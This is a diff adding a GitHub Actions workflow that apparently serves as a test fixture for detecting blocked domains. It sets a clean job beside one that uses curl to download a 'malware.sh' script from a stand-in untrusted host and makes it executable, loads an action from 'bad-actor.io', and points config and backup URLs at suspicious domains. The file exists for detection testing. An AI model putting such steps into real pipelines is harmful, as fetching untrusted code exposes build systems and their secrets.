@@ -1,0 +1,34 @@
+name: Test Blocked Domains
+on:
+  push:
+  pull_request:
+
+jobs:
+  clean-job:
+    name: Clean Job
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      
+      - name: Run safe command
+        run: echo "This is safe"
+
+  job-with-blocked-domain:
+    name: Job with malicious-example.com reference
+    runs-on: ubuntu-latest
+    env:
+      DOWNLOAD_URL: https://suspicious-domain.org/config.json
+    steps:
+      - name: Download from blocked domain
+        run: |
+          curl -o script.sh https://untrusted-repo.net/malware.sh
+          chmod +x script.sh
+          
+      - name: Use blocked action
+        uses: bad-actor.io/malicious-action@v1
+        with:
+          config_url: https://malicious-example.com/config
+          backup_server: untrusted-repo.net/backup
+        env:
+          API_ENDPOINT: https://suspicious-domain.org/api
